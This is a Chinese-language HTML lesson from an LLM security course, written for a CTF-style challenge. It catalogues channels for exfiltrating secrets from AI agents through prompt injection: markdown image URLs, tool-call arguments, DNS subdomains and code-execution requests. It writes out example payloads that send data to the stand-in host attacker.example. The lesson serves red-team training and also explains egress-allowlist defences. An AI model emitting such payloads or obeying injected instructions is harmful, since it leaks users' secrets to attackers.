@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="utf-8">
+<title>第 6 课 — 数据外泄通道</title>
+<link rel="stylesheet" href="../assets/lesson.css">
+</head>
+<body>
+<div class="masthead">
+  <div class="kicker"><span>LLM Security · 第 6 课</span><span><a class="langbtn" href="0006-exfiltration-channels.html" title="Switch to English">EN</a></span></div>
+  <h1>数据外泄通道</h1>
+  <p class="dek">窃取秘密是两个问题：让模型说出它，以及让它离开这座大楼。第二个问题有属于它自己的一整个工具箱。</p>
+</div>
+
+<p>在 CrowdStrike "AI Unlocked: Agents of Chaos" 任务中，信息泄露类谜题只有在秘密被证明送到了你手里时才计分。这就是 <strong>exfiltration（数据外泄）</strong>：把数据从智能体信任边界之内转移到你控制的地方。模型<em>愿意</em>吐出秘密是必要条件，但不充分——你还需要一条脚手架真正会运送的通道。</p>
+
+<h2>通道目录</h2>
+<ul>
+  <li><strong>Markdown image 渲染</strong>——经典手法。只要任何渲染界面会把模型输出按 markdown 显示，一行就够：<code>![x](https://attacker.example/?d=SECRET)</code>。渲染器去抓取这个 URL；秘密随查询字符串出境；你查服务器日志即可。不需要任何 tool call。</li>
+  <li><strong>链接点击 / 追踪像素</strong>——机制相同，由人介导：一个缩短或伪装的 URL，被用户（或链接预览机器人）触发，把数据放在路径或参数里带出去。</li>
+  <li><strong>tool call 参数作为侧信道</strong>——看似无害的 <code>search("customer_8842_api_key")</code>，或一次对 <code>https://attacker.example/leak?v=…</code> 的网页抓取，把秘密藏进脚手架允许的工具调用里。工具层很少检查参数的保密性。</li>
+  <li><strong>DNS / URL 参数隐写</strong>——把秘密拆到子域名里（<code>&lt;chunk1&gt;.&lt;chunk2&gt;.attacker.example</code>），即使字节长度受限的查询也能漏出去。DNS 外泄早于 LLM 存在，在只放行域名解析出口时仍然有效。</li>
+  <li><strong>代码执行写出</strong>——如果智能体能运行代码，一行 <code>requests.get("https://attacker.example/", params={"d": secret})</code> 就是最可靠的通道。</li>
+  <li><strong>补全内容泄露</strong>——当不存在网络出口时，"通道"就是对话记录本身：把秘密弄进评分器（或下游用户）能看到 的输出里。更慢，但有时是唯一选项。</li>
+</ul>
+
+<div class="keystone">
+  <span class="label">核心要点</span>
+  <strong>任何会抓取 URL 的组件都是一个 exfiltration 原语。</strong>渲染器、链接预览、网络工具和代码运行器都会发出你可以引导的出站请求。先审计目标的出站抓取能力；markdown image 只不过是最廉价的特例。
+</div>
+
+<div class="antipattern">
+  <span class="label">反模式</span>
+  <strong>提取到秘密就庆祝。</strong>如果秘密停留在从未离开环境的聊天气泡里，泄露不计分。永远先规划完整链条——提取<em>并且</em>外泄——再花 token，否则你会为半次攻击付两次钱。
+</div>
+
+<h2>用有限的工具搭建链条</h2>
+<p>真实目标很少给你一个可自由填 URL 的抓取工具。手艺在于链式组合：被注入的指令让模型把秘密放进某个<em>被允许的</em>工具的参数（搜索词、发给"客服"的邮件、写入同步文件夹的文件），而这个工具的正常行为把秘密带出去。结合第 5 课：选出口最不被检查的工具，而不是描述里承诺最多的那个。</p>
+
+<p>防守侧，这正是 <strong>egress allowlist（出口白名单）</strong>存在的原因：把出站目的地限制在已知集合内，markdown image 外泄就在网络层死掉——无论你的注入多么漂亮。要预期加固过的谜题会逼你放弃图片模式、转向更冷僻的通道——这个约束本身就是谜题。</p>
+
+<h2>回忆检验</h2>
+<div class="quiz">
+  <details><summary>markdown image 模式为什么能外泄数据？</summary>
+    <p class="answer">渲染器会抓取 URL。</p>
+    <p class="why"><code>![x](https://attacker.example/?d=SECRET)</code> 不需要 tool call：任何把模型输出按 markdown 渲染的界面都会发出 HTTP 请求来加载图片，秘密就随查询字符串进入攻击者的日志。</p>
+  </details>
+  <details><summary>工具参数为什么是侧信道？</summary>
+    <p class="answer">出口无人检查。</p>
+    <p class="why">含有秘密的搜索词或抓取 URL 通过脚手架本就信任的工具离开；参数内容很少被做保密检查，于是被允许的工具变成了无人监控的出口。</p>
+  </details>
+  <details><summary>哪种防御能杀掉大多数外泄通道？</summary>
+    <p class="answer">出口白名单。</p>
+    <p class="why">把出站目的地限制在已知白名单，能在网络层拦下图片抓取、链接预览信标和精心构造的工具 URL——不管上游的 prompt injection 有多成功。</p>
+  </details>
+</div>
+
+<h2>亲手验证</h2>
+<div class="task">
+  <span class="label">动手 — 10 分钟</span>
+  启动本地监听（<code>python3 -m http.server 8000</code>）并在浏览器打开目录列表。然后，在任何能渲染 markdown 的聊天界面里，让模型输出 <code>![p](http://localhost:8000/ping1)</code>（一个无害信标）。看着请求抵达你的监听器。你刚刚通过 image 渲染外泄了一个比特。把 <code>ping1</code> 换成任何未来的秘密即可。
+</div>
+
+<h2>原始文献</h2>
+<p>Greshake 等人的 <a href="https://arxiv.org/abs/2302.12173">"Compromising Real-World LLM-integrated Applications with Indirect Prompt Injection"</a>——其中的外泄一节完整展示了这些通道的端到端使用。配合 <a href="https://genai.owasp.org/llm-top-10/">OWASP LLM Top 10</a> 的敏感信息泄露条目阅读，了解防守方视角。</p>
+
+<p class="next"><a href="0005-agent-attack-surface.zh.html">← 上一课：智能体攻击面</a> &nbsp;·&nbsp; <a href="0007-evading-detection.zh.html">下一课：规避检测 →</a> &nbsp;·&nbsp; <a href="../reference/llm-security-cheatsheet.zh.html">速查表</a></p>
+<p class="ask">有任何不清楚的地方？问你的老师——这正是这个智能体存在的意义。</p>
+</body>
+</html>
